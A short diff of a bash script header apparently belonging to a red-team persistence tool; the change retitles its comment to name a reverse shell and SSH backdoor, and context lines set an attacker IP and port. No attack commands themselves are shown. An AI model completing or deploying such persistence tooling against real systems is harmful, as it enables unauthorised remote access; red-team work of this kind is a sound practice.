@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Red Team - Full Persistence Setup
+# Red Team - Persistence (Reverse Shell & SSH Backdoor)
 
 ATTACKER_IP="192.168.1.100"
 PORT="5555"
